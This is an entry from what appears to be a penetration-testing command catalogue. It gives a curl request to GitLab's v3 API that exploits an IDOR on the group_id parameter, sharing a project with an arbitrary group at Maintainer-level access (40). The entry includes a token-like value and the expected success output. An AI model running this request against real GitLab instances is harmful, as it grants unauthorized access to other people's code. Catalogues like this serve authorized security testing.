---
id: cmd-uuid-3
data: >-
  curl -X POST 'http://gitlab-instance/api/v3/projects/1/share' -d
  'group_id=7&group_access=40' -H 'PRIVATE-TOKEN: ZJirZUgh9QGSQfaGBHDL'
tags:
  - api
  - idor
  - gitlab
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:28.183Z'
verified: false
validated: true
submitted: true
---
# gitlab-api-share-project

## Command

```bash
curl -X POST 'http://gitlab-instance/api/v3/projects/1/share' \
  -d 'group_id=7&group_access=40' \
  -H 'PRIVATE-TOKEN: ZJirZUgh9QGSQfaGBHDL'
```

## Description

Shares a project with a group via GitLab API, vulnerable to IDOR on group_id parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `group_id` | Target group ID (e.g., 7) | Yes |
| `group_access` | Access level (40) | Yes |
| `PRIVATE-TOKEN` | API authentication token | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'http://gitlab-instance/api/v3/projects/1/share' -d 'group_id=7' -H 'PRIVATE-TOKEN: TOKEN'
```

### Advanced Usage

Specify access: -d 'group_access=40'

## Expected Output

JSON: {'message':'201 Group link created'}

## Related

- [[commands/gitlab-api-leak-group-projects]]
